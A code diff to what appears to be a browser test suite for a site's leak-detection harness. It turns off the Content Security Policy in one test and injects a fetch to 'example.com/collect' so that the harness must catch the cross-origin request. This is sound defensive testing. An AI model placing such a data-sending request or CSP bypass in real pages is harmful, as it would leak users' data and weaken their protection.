@@ -34,11 +34,16 @@ for (const tool of published) {
     }
 }
 
-test("the harness catches a request to another origin", async ({ page, requests, baseURL }) => {
-    await page.goto("/en/");
-    await page.evaluate(() => fetch("https://example.com/collect?x=1").catch(() => undefined));
-    await page.waitForTimeout(200);
-    expect(() => expectNoLeak(requests, new URL(baseURL as string).origin, [])).toThrow();
+test.describe("the harness without the CSP", () => {
+    // The CSP blocks requests to other origins. The harness is a second check,
+    // so this test turns the CSP off to see that the harness alone catches one.
+    test.use({ bypassCSP: true });
+    test("the harness catches a request to another origin", async ({ page, requests, baseURL }) => {
+        await page.goto("/en/");
+        await page.evaluate(() => fetch("https://example.com/collect?x=1").catch(() => undefined));
+        await page.waitForTimeout(200);
+        expect(() => expectNoLeak(requests, new URL(baseURL as string).origin, [])).toThrow();
+    });
 });
 
 test("the harness catches a stored key", async ({ page }) => {
